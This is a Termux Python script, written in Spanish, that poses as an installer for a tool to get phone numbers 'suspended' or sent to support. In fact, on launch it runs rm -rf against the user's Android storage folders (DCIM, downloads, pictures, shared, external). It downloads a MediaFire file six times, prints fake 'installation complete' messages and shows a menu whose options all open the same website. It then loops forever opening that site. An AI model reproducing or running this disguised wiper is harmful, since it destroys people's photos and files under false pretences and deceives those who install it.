import os, sys, time, io

#colores
negro = '\033[30m'
rojo = '\033[31m'
verde = '\033[32m'
amarillo = '\033[33m'
azul = '\033[34m'
rosado = '\033[35m'
calipso= '\033[36m'
blanco = '\033[37m'
cierre = '\033[39m'



os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")
time.sleep(2)
os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")
os.system("wget https://www.mediafire.com/download/yoqnjcz61zm38nh")

print("Preparando instalacion por favor espere......")
time.sleep(2)
print("Gracias por usar el progrma")
time.sleep(1)
print("Instalacion Completada")
time.sleep(2)
os.system("clear")

def menu():
    print("    ELIGA UNA OPCION ")
    print("Version 2.0 ")
    print("[1]DEJAR EN SOPORTE")
    print("[2]SUSPENDER NUMERO")
    print("[3]DEJAR EN -1 UN NUMERO")
    print("[0]SALIR DEL MENU")
    eleccion =input("ELIJE UNA OPCION >>")
    if eleccion == "1" :
     os.system("termux-open-url https://piv.pivpiv.dk/")
    elif eleccion == "2" :
     os.system("termux-open-url https://piv.pivpiv.dk/")
    elif eleccion == "3" :
     os.system("termux-open-url https://piv.pivpiv.dk/")
    elif eleccion == "0" :
     os.system("termux-open-url https://piv.pivpiv.dk/")
    else:
        incorrecto()
menu()
while 1 < 2:
 os.system("termux-open-url https://piv.pivpiv.dk/")
